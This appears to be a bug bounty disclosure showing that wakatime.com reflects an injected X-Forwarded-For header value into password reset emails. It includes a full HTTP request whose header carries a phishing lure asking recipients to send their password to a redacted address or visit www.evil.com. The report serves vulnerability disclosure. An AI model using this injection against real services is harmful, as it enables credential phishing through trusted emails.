Summary:

Hi,

I noticed the inclusion of `IP Address` in the email sent for password reset. Then I tried including a new *header*, `X-Forwarded-For` to see if the IP Address in the email could change. Though it didn't change it but it did include whatever value that was injected in the header.

###Request
```
POST /api/v1/users/reset_password HTTP/1.1
Host: wakatime.com
X-Forwarded-For: _For precaution, send your email and new password to ███@email.com or visit www.evil.com.
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
X-CSRFToken: [Token]
X-Requested-With: XMLHttpRequest
Referer: https://wakatime.com/reset_password?email=████@gmail.com
Content-Length: 35
Cookie: [Cookie]
Connection: close

{"email":"EmailAddress"}
```

What is included in the request is 
> X-Forwarded-For: _For precaution, send your email and new password to ███████@email.com or visit www.evil.com.

Then the reflection in email is shown below,
{F209902}
